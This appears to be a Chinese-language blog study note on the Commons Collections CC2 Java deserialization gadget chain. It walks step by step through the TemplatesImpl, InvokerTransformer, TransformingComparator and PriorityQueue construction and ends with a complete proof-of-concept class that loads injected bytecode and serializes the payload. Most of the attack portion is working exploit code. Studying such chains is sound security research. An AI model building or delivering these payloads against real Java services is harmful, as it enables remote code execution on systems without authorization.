## 前置知识

### javassist**字节码增强类库**

参考：https://www.yuque.com/m0re/demosec/okt2t3

了解这个库是怎么生成class字节码文件的。

其中CC1链在实际应用中存在一些限制，高版本的jdk就无法利用了，原因是jdk8u71版本中改写了`sun.reflect.annotation.AnnotationInvocationHandler`类的`readObject`方法，CC1链在jdk8u71版本以上已经被修复了。在jdk8u71以后的版本，重新构造了一条利用链CC2

## CC2链子分析

这个链子是放在CC4后面看的，这么理解可能更好一点，如果看过了CC4的链子，就会知道在初始化TrAXFilter的时候使用了`Transformer`数组，利用`InstantiateTransformer`去初始化`TrAXFilter.class`，到CC2则是抛弃这个利用点。

前面都一样，只是调用`newInstance`方法的方式变了，这里使用`InvokerTransformer`去调用`templates`的`transform`方法。

创建 TransformingComparator 类对象，传⼊一个临时的 Transformer 类对象，这是为了让代码能够不本地执行，在反序列化的时候执行

```java
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
```

创建 PriorityQueue 类对象 传入 transformingComparator 对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl 对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare() 中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将 priorityQueue 队列中的第一个对象设置为构造好的 templates 对象，这里贪方便就两个都设置为 templates 对象了。

```java
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);  
priorityQueue.add(templates);  
priorityQueue.add(templates);
```

最后再将值通过反射改回来。

```java
Class c = transformingComparator.getClass();  
Field transformingField = c.getDeclaredField("transformer");  
transformingField.setAccessible(true);  
transformingField.set(transformingComparator, invokerTransformer);
```

最终的POC

```java
package com.common.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        Class cc3 = templates.getClass();
        Field nameField = cc3.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "sfabc");
        Field bytecodesField = cc3.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://Test//Test.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);
        Class c = transformingComparator.getClass();
        Field transformingField = c.getDeclaredField("transformer");
        transformingField.setAccessible(true);
        transformingField.set(transformingComparator, invokerTransformer);
//        serialize(priorityQueue);
        unserialize("ser.bin");
    }
    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```